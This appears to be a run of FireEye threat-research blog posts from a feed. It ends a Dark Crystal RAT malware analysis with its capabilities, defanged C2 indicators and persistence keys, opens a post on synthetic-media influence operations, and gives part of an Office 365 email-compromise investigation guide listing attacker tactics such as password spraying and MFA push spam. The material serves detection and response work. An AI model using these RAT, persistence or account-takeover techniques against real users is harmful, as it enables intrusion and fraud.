        width="498" valign="top"><p>Play a sound file</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>opencd</p> </td> <td width="498"
          valign="top"><p>Open the CD-ROM drive door</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>shutdown</p> </td> <td width="498"
          valign="top"><p>Shut down the machine</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>restart</p> </td> <td width="498"
          valign="top"><p>Restart the machine</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>browseurl</p> </td> <td
        width="498" valign="top"><p>Open a web URL in the default
        browser</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 3: Capabilities of DCRat</span></p>
 <h4>Proof-of-Concept Dark Crystal RAT Server</h4>
 <p>After gathering information from Dark Crystal RAT about its
  capabilities and C2 message format, another way to illustrate the
  capabilities and test our understanding of the messages was to write a
  proof-of-concept server. Here is a code snippet that we wrote
  containing a <a
    href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/pocdcrat.pdf">barebones
    DCRat server written in Python</a>. Unlike a real RAT server, this
  one does not have a user interface to allow the attacker to pick and
  launch commands. Instead, it has a pre-scripted command list that it
  sends to the RAT.</p>
 <p>When the server starts up, it uses the Python BaseHTTPServer to
  begin listening for incoming web requests (lines 166-174). Incoming
  POST requests are assumed to hold a file that the RAT is uploading to
  the server; this server assumes all file uploads are screenshots and
  saves them to “screen.png” (lines 140-155). For GET requests, the
  server must distinguish between beacons, ordinary messages, and
  special messages (lines 123-138). For ordinary messages, <span
  class="code">__ds_setdata</span> messages are simply printed to
  standard output, while the only <span class="code">__ds_getdata</span>
  message type supported is <span class="code">s_comm</span> (screenshot
  communications), to which the server responds with the desired
  screenshot dimensions (lines 63-84). For messages of type comm, the
  server sends four types of commands in sequence: first, it hides the
  desktop icons; then, it causes the string “Hello this is tech support”
  to be spoken; next, it displays a message box asking for a password;
  finally, it launches the Windows Calculator (lines 86-121).</p>
 <p>Figure 16 shows the results when Dark Crystal RAT is run on a system
  that has been configured to redirect all traffic to domalo[.]online to
  the proof-of-concept server we wrote.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure17.jpg" alt="" />
  <br /> <span class="type-XS">Figure 16: The results when a Dark
    Crystal RAT instance communicates with the proof-of-concept server</span></p>
 <h4>Other Work and Reconnaissance</h4>
 <p>After reverse engineering Dark Crystal RAT, we continued
  reconnaissance to see what additional information we could find. One
  limitation to our analysis was that we did not wish to allow the
  sample to communicate with the real C2, so we kept it isolated from
  the Internet. To learn more about Dark Crystal RAT we tried two
  approaches: the first was to browse the Dark Crystal RAT website
  (files.dcrat[.]ru) using Tor, and the other was to take a look at
  YouTube videos of others’ experiments with the “real” Dark Crystal RAT server.</p>
 <h5>Dark Crystal RAT Website</h5>
 <p>We found that Dark Crystal RAT has a website at files.dcrat[.]ru,
  shown in Figure 17. Observe that there are options to download the RAT
  itself, as well as a few plugins; the DCLIB extension is consistent
  with the plugin loading code we found in the RAT.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure18.png" alt="" />
  <br /> <span class="type-XS">Figure 17: The website files.dcrat[.]ru
    allows users to download Dark Crystal RAT and some of its plugins</span></p>
 <p>Figure 18 shows some additional plugins, including plugins with the
  ability to resist running in a virtual machine, disable Windows
  Defender, and disable webcam lights on certain models. No plugins were
  bundled with the sample we studied.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure19.png" alt="" />
  <br /> <span class="type-XS">Figure 18: Additional plugins listed on
    the Dark Crystal RAT website</span></p>
 <p>Figure 19 lists software downloads on the RAT page. We took some
  time to look at these files; here are some interesting things we discovered:</p>
 <ul> <li>The DCRat listed on the website is actually a “builder” that
    packages a build of the RAT and a configuration for the attacker to
    deploy. This is consistent with the name DCRatBuild.exe shown back
    in Figure 4. In our brief testing of the builder, we found that it
    had a licensing check. We did not pursue bypassing it once we found
    public YouTube videos of the DCRat builder in operation, as we show
  later.</li> <li>The DarkCrystalServer is not self-contained, rather,
    it is just a PHP file that allows the user to supply a username and
    password, which causes it to download and install the server
    software. Due to the need to supply credentials and communicate back
    with dcrat[.]ru (Figure 20), we did not pursue further analysis of
  DarkCrystalServer.</li> </ul>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure20.png" alt="" />
  <br /> <span class="type-XS">Figure 19: The RAT page lists software
    for the RAT, the server, an API, and plugin development</span></p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure21.png" alt="" />
  <br /> <span class="type-XS">Figure 20: The DarkCrystalServer asks for
    a username and password and calls back to dcrat[.]ru to download
    software, so we did not pursue it further</span></p>
 <h5>YouTube Videos</h5>
 <p>As part of confirming our findings about Dark Crystal RAT
  capabilities that we obtained through reverse engineering, we found
  some YouTube demonstrations of the DCRat builder and server.</p>
 <p>The YouTube user <i>LIKAR </i>has a <a
    href="https://www.youtube.com/watch?v=ElqjEzv9vog">YouTube
    demonstration of Dark Crystal RAT</a>. The author demonstrates use
  of the Dark Crystal RAT software on a server with two active RAT
  instances. During the video, the author browses through the various
  screens in the software. This made it easy to envision how a cyber
  threat would use the RAT, and to confirm our suspicions of how it works.</p>
 <p>Figure 21 shows a capture from the video at <a
  href="https://youtu.be/ElqjEzv9vog?t=207">3:27</a>. Note that the Dark
  Crystal RAT builder software refers to the DCRatBuild package as a
  “server” rather than a client. Nonetheless, observe that one of the
  options was a type of Java, or C# (Beta). By watching this YouTube
  video and doing some additional background research, we discovered
  that Dark Crystal RAT has existed for some time in a Java version. The
  C# version is relatively new. This explained why we could not find
  much detailed prior reporting about it.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure22.png" alt="" />
  <br /> <span class="type-XS">Figure 21: A YouTube demonstration
    revealed that Dark Crystal RAT previously existed in a Java version,
    and the C# version we analyzed is in beta</span></p>
 <p>Figure 22 shows another capture from the video at 6:28. The
  functionality displayed on the screen lines up nicely with the
  “msgbox”, “browseurl”, “clipboard”, “speak”, “opencd”, “closecd”, and
  other capabilities we discovered and enumerated in Table 6.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure23.png" alt="" />
  <br /> <span class="type-XS">Figure 22: A YouTube demonstration
    confirmed many of the Dark Crystal RAT capabilities we found in
    reverse engineering</span></p>
 <h4>Conclusion</h4>
 <p>In this post we walked through our analysis of the sample that the
  threat intel team provided to us and all its components. Through our
  initial triage, we found that its “dfsds.exe” component is Dark
  Crystal RAT. We found that Dark Crystal RAT was a .NET executable, and
  reverse engineered it. We extracted the malware’s configuration, and
  through dynamic analysis discovered the syntax of its C2
  communications. We implemented a small proof-of-concept server to test
  the correct format of commands that can be sent to the malware, and
  how to interpret its uploaded screenshots. Finally, we took a second
  look at how actual threat actors would download and use Dark Crystal RAT.</p>
 <p>To conclude, indicators of compromise for this version of Dark
  Crystal RAT (MD5: 047af34af65efd5c6ee38eb7ad100a01) are given in Table 4.</p>
 <h4>Indicators of Compromise</h4>
 <h5>Dark Crystal RAT (dfsds.exe)</h5>
 <table border="0" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="174" valign="top"><p>
          <b>Handle artifacts</b></p> </td> <td width="450"
        valign="top"><p> </p> </td> </tr>
    <tr>
      <td width="174" valign="top"><p>Mutex name</p> </td> <td
        width="450" valign="top"><p>bc2dc004028c4f0303f5e49984983352</p>
      </td> </tr>
    <tr>
      <td width="174" valign="top"><p>
          <b>Registry artifacts</b></p> </td> <td width="450"
        valign="top"><p> </p> </td> </tr>
    <tr>
      <td width="174" valign="top"><p>Registry value</p> </td> <td
        width="450"
        valign="top"><p>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\scrss</p>
      </td> </tr>
    <tr>
      <td width="174" valign="top"><p>Registry value</p> </td> <td
        width="450"
        valign="top"><p>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Wininit</p>
      </td> </tr>
    <tr>
      <td width="174" valign="top"><p>
          <b>File system artifacts</b></p> </td> <td width="450"
        valign="top"><p> </p> </td> </tr>
    <tr>
      <td width="174" valign="top"><p>File</p> </td> <td width="450"
        valign="top"><p>C:\Sysdll32.lnk</p> </td> </tr>
    <tr>
      <td width="174" valign="top"><p>File</p> </td> <td width="450"
        valign="top"><p>%APPDATA%\dotNET.lnk</p> </td> </tr>
    <tr>
      <td width="174" valign="top"><p>File</p> </td> <td width="450"
          valign="top"><p>Start Menu\Programs\Startup\Sysdll32.lnk</p>
      </td> </tr>
    <tr>
      <td width="174" valign="top"><p>File</p> </td> <td width="450"
          valign="top"><p>Start Menu\Programs\Startup\dotNET.lnk</p>
      </td> </tr>
    <tr>
      <td width="174" valign="top"><p>File</p> </td> <td width="450"
          valign="top"><p>%APPDATA%\&lt;random process name&gt;.exe</p>
      </td> </tr>
    <tr>
      <td width="174" valign="top"><p>File</p> </td> <td width="450"
          valign="top"><p>C:\&lt;random process name&gt;.exe</p> </td> </tr>
    <tr>
      <td width="174" valign="top"><p>
          <b>Network artifacts</b></p> </td> <td width="450"
        valign="top"><p> </p> </td> </tr>
    <tr>
      <td width="174" valign="top"><p>HTTP request</p> </td> <td
        width="450"
          valign="top"><p>hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91due<br />
          u3qa54/46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9kl<br />
        vv3/212bad81b4208a2b412dfca05f1d9fa7.php?data=active</p> </td> </tr>
    <tr>
      <td width="174" valign="top"><p>HTTP request</p> </td> <td
        width="450"
          valign="top"><p>hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91due<br />
          u3qa54/46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9kl<br />
          vv3/akcii239myzon0xwjlxqnn3b34w212bad81b4208a2b412dfca05f1d9f<br />
          a7.php?
          type=__ds_getdata&amp;__ds_getdata_user=&lt;user_hash&gt;&amp;__ds_getdata_ex<br />
        t=&lt;message_hash&gt;&amp;__ds_getdata_key=&lt;key&gt;</p>
      </td> </tr>
    <tr>
      <td width="174" valign="top"><p>HTTP request</p> </td> <td
        width="450" valign="top"><p>hxxp://domalo[.]online
          /ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqbjvyklunp<br />
          1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xw<br />
        jlxqnn3b34w/&lt;user_hash&gt;.&lt;message_hash&gt;</p> </td> </tr>
    <tr>
      <td width="174" valign="top"><p>TCP connection</p> </td> <td
        width="450" valign="top"><p>domalo[.]online:80</p> </td> </tr>
    <tr>
      <td width="174" valign="top"><p>TCP connection</p> </td> <td
        width="450" valign="top"><p>ipinfo[.]ip</p> </td> </tr>
    <tr>
      <td width="174" valign="top"><p>DNS lookup</p> </td> <td
        width="450" valign="top"><p>domalo[.]online</p> </td> </tr>
    <tr>
      <td width="174" valign="top"><p>DNS lookup</p> </td> <td
        width="450" valign="top"><p>ipinfo[.]ip</p> </td> </tr>
    <tr>
      <td width="174" valign="top"><p>
          <b>Strings</b></p> </td> <td width="450" valign="top"><p> </p>
      </td> </tr>
    <tr>
      <td width="174" valign="top"><p>Static string</p> </td> <td
        width="450" valign="top"><p>DCRatBuild</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 4: IoCs for this instance of DCRat</span></p>
 <h4>FireEye Product Support for Dark Crystal RAT</h4>
 <p>Table 5 describes how FireEye products react to the initial sample
  (MD5: b478d340a787b85e086cc951d0696cb1) and its Dark Crystal RAT
  payload, or in the case of Mandiant Security Validation, allow a
  stakeholder to validate their own capability to detect Dark Crystal RAT.</p>
 <table border="0" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="234" valign="top"><p>
          <b>FireEye Product</b></p> </td> <td width="389" valign="top"><p>
          <b>Support for Dark Crystal RAT</b></p> </td> </tr>
    <tr>
      <td width="234" valign="top"><p>FireEye Network Security (NX)</p>
      </td> <td width="389" valign="top"><p>Backdoor.Plurox
        detection</p> </td> </tr>
    <tr>
      <td width="234" valign="top"><p>FireEye Email Security (EX &amp;
        ETP)</p> </td> <td width="389"
          valign="top"><p>Backdoor.MSIL.DarkCrystal, Backdoor.Plurox,
          Malware.Binary.exe, Trojan.Vasal.FEC3,
          Win.Ransomware.Cerber-6267996-1, fe_ml_heuristic
        detections</p> </td> </tr>
    <tr>
      <td width="234" valign="top"><p>FireEye Endpoint Security (HX)</p>
      </td> <td width="389" valign="top"><p>Trojan.GenericKD.32546165,
          Backdoor.MSIL.DarkCrystal detections</p> </td> </tr>
    <tr>
      <td width="234" valign="top"><p>FireEye Malware Analysis (AX)</p>
      </td> <td width="389" valign="top"><p>Backdoor.Plurox.FEC2
        detection</p> </td> </tr>
    <tr>
      <td width="234" valign="top"><p>FireEye Detection on Demand
        (DoD)</p> </td> <td width="389"
          valign="top"><p>Backdoor.Plurox.FEC2, FireEye.Malware
        detections</p> </td> </tr>
    <tr>
      <td width="234" valign="top"><p>Mandiant Security Validation</p>
      </td> <td width="389" valign="top"><p>Built-in Action coming
        soon</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 5: Support in FireEye products to detect
    Dark Crystal RAT or validate detection capability</span></p>
http://www.fireeye.com/blog/threat-research/2020/05/analyzing-dark-crystal-rat-backdoor.html2020-05-12T14:30:00.000Z2020-08-18T19:35:50.967ZRepurposing Neural Networks to Generate Synthetic Media for Information Operationsnoemail@noemail.orgPhilip Tully<p>FireEye’s Data Science and Information Operations Analysis teams
  released this blog post <a
    href="https://www.blackhat.com/us-20/briefings/schedule/#repurposing-neural-networks-to-generate-synthetic-media-for-information-operations-19529">to
    coincide with our Black Hat USA 2020 Briefing</a>, which details how
  open source, pre-trained neural networks can be leveraged to generate
  synthetic media for malicious purposes. To summarize our presentation,
  we first demonstrate three successive proof of concepts for how
  machine learning models can be fine-tuned in order to generate
  customizable synthetic media in the text, image, and audio domains.
  Next, we illustrate examples in which synthetically generated media
  have been weaponized for information operations (IO), as detected on
  the front lines by Mandiant Threat Intelligence. Finally, we outline
  challenges in detecting synthetically generated content, and lay out
  potential paths forward in a future where synthetically generated
  media will increasingly look, speak, and write like us.</p>
 <table border="1" cellspacing="0" cellpadding="0" width="90%"
  style="margin: 0 auto 20.0px;"> <tbody>
    <tr>
      <td width="100%" valign="top"><p>
          <i>Highlights</i></p> <ul> <li>Open source, pre-trained
            natural language processing, computer vision, and speech
            recognition neural networks can be weaponized for offensive
            social media-driven IO campaigns.</li> <li>Detection,
            attribution, and response is challenging in scenarios where
            actors can anonymously generate and distribute credible fake
            content using proprietary training datasets.</li> <li>The
            security community can and should help AI researchers,
            policy makers, and other stakeholders mitigate the harmful
            use of open source models.</li> </ul> </td> </tr></tbody></table>
 <h4>Background: Synthetic Media, Generative Models, and Transfer Learning</h4>
 <p>Synthetic media is by no means a new development; methods for
  manipulating media for specific agendas are as old as the media
  themselves. In the 1930’s, the chief of the Soviet secret police was
  photographed walking alongside Joseph Stalin before being retouched
  out of an official press photo, <a
    href="https://en.wikipedia.org/wiki/Censorship_of_images_in_the_Soviet_Union">after
    he <i>himself </i>was arrested and executed during the Great
  Purge</a>. Digital graphic manipulation like this became prominent
  with the advent of Photoshop. Then later in the 2010’s, the term
  “deepfake” was coined. While deepfake videos, including techniques
  like face swapping and lip syncing, are concerning in the long term,
  this blog post focuses on more basic, but we argue more believable,
  synthetic media generation advancements in the text, static image, and
  audio domains. Machine learning approaches for creating synthetic
  media are underpinned by generative models, which have been
  effectively misused <a href="https://techscience.org/a/2019121801/">to
    fabricate high volume submissions to federal public comment
  websites</a> and <a
    href="https://www.forbes.com/sites/jessedamiani/2019/09/03/a-voice-deepfake-was-used-to-scam-a-ceo-out-of-243000/#49bb4bd82241">clone
    a voice to trick an executive into handing over $240,000</a>.</p>
 <p>The pre-training required to produce models capable of synthetic
  media generation can cost thousands of dollars, take weeks or months
  of time, and require access to expensive GPU clusters. However, the
  application of <a
    href="https://en.wikipedia.org/wiki/Transfer_learning">transfer
  learning</a> can drastically reduce the amount of time and effort
  involved. In transfer learning, we start from a large generic model
  that has been pre-trained for an initial task where copious data is
  available. We then leverage the model’s acquired knowledge to train it
  further on a different, smaller dataset so that it excels at a
  subsequent, related task. This process of training the model further
  is referred to as <i>fine-tuning</i>, which typically requires less
  resources compared to pre-training from scratch. You can think of this
  in more relatable terms—if you’re a professional tennis player, you
  don’t need to completely relearn how to swing a racket in order to
  excel at badminton.</p>
http://www.fireeye.com/blog/threat-research/2020/08/repurposing-neural-networks-to-generate-synthetic-media-for-information-operations.html2020-08-05T18:00:00.000Z2020-08-05T22:14:26.219ZAnnouncing the Seventh Annual Flare-On Challengenoemail@noemail.orgNick Harbour<p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/flareon7/FLARE-On%207.png"
    alt="" class="float-right-small" />The Front Line Applied Research
  &amp; Expertise (FLARE) team is honored to announce that the popular
  Flare-On challenge will return for a triumphant seventh year. Ongoing
  global events proved no match against our passion for creating
  challenging and fun puzzles to test and hone the skills of aspiring
  and experienced reverse engineers.</p>
 <p>The contest will begin at 8:00 p.m. ET on Sept. 11, 2020. This is a
  CTF-style challenge for all active and aspiring reverse engineers,
  malware analysts and security professionals. The contest runs for six
  full weeks and ends at 8:00 p.m. ET on Oct. 23, 2020.</p>
 <p>This year’s contest features a total of 11 challenges in a variety
  of formats, including Windows, Linux, Python, VBA and .NET. This is
  one of the only Windows-centric CTF contests out there and we have
  crafted it to closely represent the challenges faced by our FLARE team
  on a daily basis.</p>
 <p>If you are skilled and dedicated enough to complete the seventh
  Flare-On challenge, you will receive a prize and recognition on the
  Flare-On website for your accomplishment. Prize details will be
  revealed later, but as always, it will be worthwhile swag to earn the
  envy of your peers. In previous years we sent out belt buckles,
  replica police badges, challenge coins, medals and huge pins.</p>
 <p>Check the <a href="http://flare-on.com/">Flare-On website</a> for a
  live countdown timer, to view the previous year’s winners, and to
  download past challenges and solutions for practice. For official news
  and information, we will be using the Twitter hashtag: #flareon7.</p>
http://www.fireeye.com/blog/threat-research/2020/08/announcing-the-seventh-annual-flare-on-challenge.html2020-08-04T15:00:00.000Z2020-08-05T15:26:19.902ZObscured by Clouds: Insights into Office 365 Attacks and How Mandiant
Managed Defense Investigatesnoemail@noemail.orgJoseph Hladik<p>With Business Email Compromises (BECs) <a
    href="https://pdf.ic3.gov/2019_IC3Report.pdf">showing no signs of
    slowing down</a>, it is becoming increasingly important for security
  analysts to understand Office 365 (O365) breaches and how to properly
  investigate them. This blog post is for those who have yet to dip
  their toes into the waters of an O365 BEC, providing a crash course on
  Microsoft’s cloud productivity suite and its assortment of logs and
  data sources useful to investigators. We’ll also go over common
  attacker tactics we’ve observed while responding to BECs and provide
  insight into how Mandiant Managed Defense analysts approach these
  investigations at our customers using PowerShell and the <a
    href="/content/fireeye-www/en_US/products/helix.html">FireEye Helix platform</a>.</p>
 <h4>Office 365</h4>
 <p>Office 365 is Microsoft’s cloud-based subscription service for the
  Microsoft Office suite. It is built from dozens of applications
  tightly embedded into the lives of today’s workforce, including:</p>
 <ul> <li>Exchange Online, for emails</li> <li>SharePoint, for intranet
    portals and document sharing</li> <li>Teams and Skype for Business,
    for instant messaging</li> <li>OneDrive, for file sharing</li>
    <li>Microsoft Stream, for recorded meetings and presentations</li> </ul>
 <p>As more and more organizations decide to adopt Microsoft’s
  cloud-based offering to meet their needs, unauthorized access to these
  O365 environments, or <i>tenants</i> in Microsoft’s parlance, has
  become increasingly lucrative to motivated attackers. The current high
  adoption rate of O365 means that attackers are getting plenty of hands
  on experience with using and abusing the platform. While many tactics
  have remained largely unchanged in the years since we’ve first
  observed them, we’ve also witnessed the evolution of techniques that
  are effective against even security-conscious users.</p>
 <p>In general, the O365 compromises we’ve responded to have fallen into
  two categories:</p>
 <ul> <li>Business Email Compromises (BECs)</li> <li>APT or
    state-sponsored intrusions</li> </ul>
 <p>Based on our experience, BECs are a common threat to any
  organization's O365 tenant. The term “BEC” typically refers to a type
  of fraud committed by financially motivated attackers. BEC actors
  heavily rely on social engineering to carry out their schemes,
  ultimately defrauding organizations and even personnel.</p>
 <p>One common BEC scheme involves compromising a C-suite executive’s
  account via phishing. Once the victim unwittingly enters their
  credentials into a web form masquerading as the legitimate Office 365
  login portal, attackers log in and instruct others in the organization
  to conduct a wire transfer, perhaps under the guise of an upcoming
  acquisition that has yet to be publicly announced. However, we’ve also
  observed more effective schemes where attackers compromise those in
  financial positions and patiently wait until an email correspondence
  has begun about a due payment. Attackers seize this opportunity by
  sending a doctored invoice (sometimes based on a legitimate invoice
  that had been stolen earlier) on behalf of the compromised user to
  another victim responsible for making payments. These emails are
  typically hidden from the compromised user due to attacker-created
  Outlook mailbox rules. Often times, by the time the scheme is
  inevitably discovered and understood days or weeks later, the money is
  unrecoverable—highlighting the importance of contacting law
  enforcement immediately if you’ve fallen victim to a fraud.</p>
 <p>The personal finances of staff aren’t off limits to attackers
  either. We’ve observed several cases of W-2 scams, in which attackers
  send a request to HR for W-2 information from the victim’s account.
  Once obtained, this personally identifiable information is later used
  to conduct tax fraud.</p>
 <p>Conversely, APT intrusions are typically more sophisticated and are
  conducted by state-sponsored threat actors. Rather than for financial
  gain, APT actors are usually tasked to compromise O365 tenants for
  purposes of espionage, data theft, or destruction. Given the wealth of
  sensitive information housed in any given organization’s O365 tenant,
  APT actors may not even need to touch a single endpoint to complete
  their mission, sidestepping the many security controls organizations
  have implemented and invested in.</p>
 <h4>O365 Logs and Data Sources</h4>
 <p>In this section, we’ll touch on the multitude of logs and portals
  containing forensic data relevant to an O365 investigation.</p>
 <p>Before we can begin investigating an O365 case, we’ll work with our
  clients to get an “Investigator” account provisioned with the roles
  required to obtain the forensic data we need. For the purposes of this
  blog post, we’ll quickly list the roles needed for an Investigator
  account, but during an active Managed Defense investigation, a
  designated Managed Defense consultant will provide further guidance on
  account provisioning.</p>
 <p>At a minimum, the Investigator account should have the following roles:</p>
 <p>
  <i>Exchange Admin Roles</i></p>
 <ul> <li>View-only audit logs</li> <li>View-only configuration</li>
    <li>View-only recipients</li> <li>Mailbox Search</li> <li>Message
  Tracking</li> </ul>
 <p>
  <i>eDiscovery Rights</i></p>
 <ul> <li>eDiscovery Manager role</li> </ul>
 <p>
  <i>Azure Active Directory Roles</i></p>
 <ul> <li>Global Reader</li> </ul>
 <p>
  <b>Unified Audit Log (UAL)</b></p>
 <p>The Unified Audit Log records activity from various applications
  within the Office 365 suite, and can be considered O365’s main log
  source. Entries in the UAL are stored in JSON format. We recommend
  using the PowerShell cmdlet <b>Search-UnifiedAuditLog</b> to query the
  UAL as it allows for greater flexibility, though it can also be
  acquired from the Office 365 Security &amp; Compliance Center located
  at <a href="https://protection.office.com/">protection.office.com</a>.
  In order to leverage this log source (and the Admin Audit Log), ensure
  that the <i>Audit Log Search</i> feature is enabled.</p>
 <p>The UAL has a few nuances that are important to consider. While it
  provides a good high-level summary of activity across various O365
  applications, it won’t log comprehensive mailbox activity (for that,
  acquire the Mailbox Audit Log). Furthermore, the UAL has a few
  limitations, namely:</p>
 <ul> <li>Results to a single query are limited to 5000 results</li>
    <li>Only 90 days of activity are retained</li> <li>Events may take
    up to 24 hours before they are searchable</li> </ul>
 <p>
  <b>Mailbox Audit Log (MAL)</b></p>
 <p>The Mailbox Audit Log, part of Exchange Online, will capture
  additional actions performed against objects within a mailbox. As
  such, it’s a good idea acquire and analyze the MAL for each affected
  user account with the PowerShell cmdlet <b>Search-MailboxAuditLog</b>.
  Note that entries in the MAL will be retained for 90 days (by default)
  and timestamps will be based on the user’s local time zone. The MAL’s
  retention time can always be increased with the PowerShell cmdlet
  <b>Set-Mailbox</b> along with the <b>AuditLogAgeLimit</b> parameter.</p>
 <p>At the time of writing this post, Microsoft has recently <a
    href="https://docs.microsoft.com/en-us/microsoft-365/compliance/advanced-audit?view=o365-worldwide">released
  information</a> about enhanced auditing functionality that gives
  investigators insight into which emails were accessed by attackers.
  This level of logging for regular user accounts is only available for
  organizations with an Office 365 E5 subscription. Once Advanced
  Auditing is enabled, mail access activity will be logged under the
  <i>MailItemsAccessed</i> operation in both the UAL and MAL.</p>
 <p>
  <b>Administrator Audit Log</b></p>
 <p>If the <i>Audit Log Search</i> feature is enabled, this supplemental
  data source logs all PowerShell administrative cmdlets (including
  command-line arguments) executed by administrators. If you suspect
  that an administrator account was compromised, don’t overlook this
  log! The PowerShell cmdlet <b>
    <i>Search-AdminAuditLog</i></b> is used to query these logs, but
  note that the <i>Audit Log Search</i> feature must be enabled and the
  same 90 day retention limit will be in place.</p>
 <p>
  <b>Azure AD Logs</b></p>
 <p>Azure AD logs can be accessed from the Azure portal (<a
  href="https://portal.azure.com/">portal.azure.com</a>) under the Azure
  Active Directory service. Azure AD Sign-in logs contain detailed
  information about how authentications occur and O365 application
  usage. Azure AD audit logs are also a valuable source of information,
  containing records of password resets, account creations, role
  modifications, OAuth grants, and more that could be indicative of
  suspicious activity. Note that Azure AD logs are only available for 30 days.</p>
 <p>
  <b>Cloud App Security Portal</b></p>
 <p>For cases where OAuth abuse has been observed, information about
  cloud applications can be found in Microsoft’s Cloud App Security
  portal (<a
  href="https://portal.cloudappsecurity.com/">portal.cloudappsecurity.com</a>).
  Access to this portal requires an E5 license or a standalone Cloud App
  license. For more background on OAuth abuse, be sure to check out our
  blog post: <i>
    <a
      href="/content/fireeye-www/en_US/blog/threat-research/2018/05/shining-a-light-on-oauth-abuse-with-pwnauth.html">Shining
      a Light on OAuth Abuse with PwnAuth</a></i>.</p>
 <p>
  <b>Message Traces</b></p>
 <p>Message traces record the emails sent and received by a user. During
  an investigation, run reports on any email addresses of interest. The
  message trace report will contain detailed mail flow information as
  well as subject lines, original client IP addresses, and message
  sizes. Message traces are useful for identifying emails sent by
  attackers from compromised accounts, and can also aid in identifying
  initial phishing emails if phishing was used for initial access. To
  obtain the actual emails, use the Content Search tool.</p>
 <p>Only the past 10 days of activity is available with the
  <b>Get-MessageTrace</b> PowerShell cmdlet. Historical searches for
  older messages can be run with the <b>Get-HistoricalSearch</b> cmdlet
  (up to 90 days by default), but historical searches typically take
  hours for the report to be available. Historical reports can also be
  generated within the Security and Compliance Center.</p>
 <p>
  <b>eDiscovery Content Searches</b></p>
 <p>The Content Search tool allows investigators to query for emails,
  documents, and instant message conversations stored in an Office 365
  tenant. We frequently run Content Search queries to find and acquire
  copies of emails sent by attackers. Content searches are limited to
  what has been indexed by Microsoft, so recent activity may not
  immediately appear. Additionally, only the most recent 1000 items will
  be shown in the preview pane.</p>
 <h4>Anatomy of an O365 BEC</h4>
 <p>As mentioned earlier, BECs are one of the more prevalent threats to
  O365 tenants seen by Managed Defense today. Sometimes, Mandiant
  analysts respond to several BEC cases at our customers within the same
  week. With this frontline experience, we’ve compiled a list of
  commonly observed tactics and techniques to advise our readers about
  the types of activities one should anticipate. Please note that this
  is by no means a comprehensive list of O365 attacks, rather a focus on
  the usual routes we’ve seen BEC actors take to accomplish their objective.</p>
 <p>
  <b>Phase 1: Initial Compromise</b></p>
 <ul> <li>
    <u>Phishing</u>: Emails with links to credential harvesting forms
    sent to victims, sometimes from the account of a compromised
    business partner.</li> <li>
    <u>Brute force</u>: A large dictionary of passwords attempted
    against an account of interest.</li> <li>
    <u>Password spray</u>: A dictionary of commonly used passwords
    attempted against a list of known user accounts.</li> <li>
    <u>Access to credential dump</u>: Valid credentials used from a
    previous compromise of the user.</li> <li>
    <u>MFA bypasses</u>: Use of mail clients leveraging legacy
    authentication protocols (e.g. IMAP/POP), which bypass MFA policies.
    Attackers may also spam push notifications to the victim by
    repeatedly attempting to log in, eventually leading to the victim
    mistakenly accepting the prompt.</li> </ul>
 <p>
  <b>Phase 2: Establish Foothold</b></p>
 <ul> <li>
    <u>More phishing</u>: Additional phishing lures sent to
    internal/external contacts from Outlook’s global address list.</li> <li>
    <u>More credible lures</u>: New phishing lures uploaded to the
    compromised user's OneDrive or SharePoint account and shared with
    the victim’s coworkers.</li> <li>
    <u>SMTP forwarding</u>: SMTP forwarding enabled in the victim’s
    mailbox to forward all email to an external address.</li> <li>
    <u>Forwarding mailbox rules</u>: Mailbox rules created to forward
    all or certain mail to an external address.</li> <li>
    <u>Mail client usage</u>: Outlook or third-party mail clients used
    by attackers. Mail will continue to sync for a short while after a
    password reset occurs.</li> </ul>
 <p>
  <b>Phase 3: Evasion</b></p>
 <ul> <li>
    <u>Evasive mailbox rules</u>: Mailbox rules created to delete mail
    or move some or all incoming mail to uncommonly used folders in
    Outlook, such as “RSS Subscriptions”.</li> <li>
    <u>Manual evasion</u>: Manual deletion of incoming and sent mail.
    Attackers may forego mailbox rules entirely.</li> <li>
    <u>Mail forwarding</u>: Attackers accessing emails without logging
    in if a mechanism to forward mail to an external address was set up
  earlier.</li> <li>
    <u>Mail client usage</u>: Outlook or third-party mail clients used
    by attackers. Mail can be synced locally to the attacker’s machine
    and accessed later.</li> <li>
    <u>VPN usage</u>: VPN servers, sometimes with similar geolocations
    to their victims, used in an attempt to avoid detection and evade
    conditional access policies.</li> </ul>
 <p>
  <b>Phase 4: Internal Reconnaissance</b></p>
 <ul> <li>
    <u>Outlook searching</u>: The victim’s mailbox queried by attackers
    for emails of interest. While not recorded in audit logs, it may be
    available to <a
    href="https://support.office.com/en-us/article/delete-search-history-or-export-search-history-in-outlook-on-the-web-582647f4-fae8-46ed-9f78-49b919ddfc69">export</a>
    if it was not deleted by attackers.</li> <li>
